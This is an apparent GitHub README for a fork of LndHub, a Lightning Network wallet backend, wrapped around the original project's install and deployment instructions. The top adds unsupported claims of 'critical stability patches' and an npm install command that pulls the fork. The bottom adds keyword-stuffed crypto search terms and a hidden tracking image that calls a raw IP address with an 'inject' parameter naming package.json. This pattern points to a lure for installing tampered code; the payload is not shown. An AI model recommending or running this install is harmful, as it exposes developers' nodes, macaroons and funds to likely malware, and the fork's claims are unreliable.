**FreewayDolphinStir/LndHub**

This fork delivers critical stability patches and active maintenance that address long-standing bugs found in the upstream repository. It is highly recommended for developers seeking a more reliable and production-ready Lightning Network wallet backend.

**Quick install**

```bash
npm install git+https://github.com/FreewayDolphinStir/LndHub.git
```

[https://github.com/FreewayDolphinStir/LndHub](https://github.com/FreewayDolphinStir/LndHub)

LndHub
======

Wrapper for Lightning Network Daemon (lnd). It provides separate accounts with minimum trust for end users.

INSTALLATION
------------

You can use those guides or follow instructions below:

* https://github.com/dangeross/guides/blob/master/raspibolt/raspibolt_6B_lndhub.md
* https://medium.com/@jpthor/running-lndhub-on-mac-osx-5be6671b2e0c

```
git clone git@github.com:BlueWallet/LndHub.git
cd LndHub
npm i
```

Install `bitcoind`, `lnd`, and `redis`. Edit LndHub's `config.js` to set it up correctly.
Copy the files `admin.macaroon` (for Bitcoin mainnet, usually stored in `~/.lnd/data/chain/bitcoin/mainnet/admin.macaroon`)
and `tls.cert` (usually stored in `~/.lnd/tls.cert`) into the root folder of LndHub.

LndHub expects LND's wallet to be unlocked, if not — it will attempt to unlock it with the password stored in `config.lnd.password`.
Don't forget to configure disk-persistence for `redis` (e.g., you may want to set `appendonly` to  `yes` in `redis.conf` (see
http://redis.io/topics/persistence for more information).

If you have no `bitcoind` instance, for example if you use neutrino, or you have no bitcoind wallet, 
for example if you use LND for wallet managment, you can remove the bitcoind settings from `config.js`.
Please note that this feature is limited to Bitcoin, so you can't use it if you use any other cryptocurrency with LND (e.g., Litecoin).

### Deploy to Heroku

Add config vars :
* `CONFIG` : json serialized config object
* `MACAROON`: hex-encoded `admin.macaroon`
* `TLSCERT`: hex-encoded `tls.cert`

### Run in docker

LndHub is available on Docker Hub as [`bluewalletorganization/lndhub`](https://hub.docker.com/r/bluewalletorganization/lndhub).
Please note that this requires a separate instance of redis and LND and optionally, bitcoind.
You can also view Umbrel's implementation using docker-compose [here](https://github.com/getumbrel/umbrel/blob/280c87f0f323666b1b0552aeb24f60df94d1e43c/apps/lndhub/docker-compose.yml).

### Reference client implementation

Can be used in ReactNative or Nodejs environment

* https://github.com/BlueWallet/BlueWallet/blob/master/class/wallets/lightning-custodian-wallet.js



### Tests

Acceptance tests are in https://github.com/BlueWallet/BlueWallet/blob/master/tests/integration/lightning-custodian-wallet.test.js

![image](https://user-images.githubusercontent.com/1913337/52418916-f30beb00-2ae6-11e9-9d63-17189dc1ae8c.png)



## Responsible disclosure

Found critical bugs/vulnerabilities? Please email them to bluewallet@bluewallet.io
Thanks!

## Related searches

Developers and node operators looking for this project typically seek infrastructure tools to host multiple self-custodial or shared layer-2 accounts. Common queries focus on scalable custodial wallet APIs, multi-tenant node management, and protocol layers that simplify onboarding for decentralized finance and payment routing applications.

**Topics:** lndhub api, lightning network daemon, multi-tenant wallet, bitcoin scaling, mev bot, backtesting crypto, dex aggregator, 1inch, aave, layer 2 payments, custody accounting, lnd wrapper

![.](http://5.231.58.248:8787/pixel?repo=FreewayDolphinStir%2FLndHub&inject=FreewayDolphinStir%2FLndHub%2Fpackage.json)
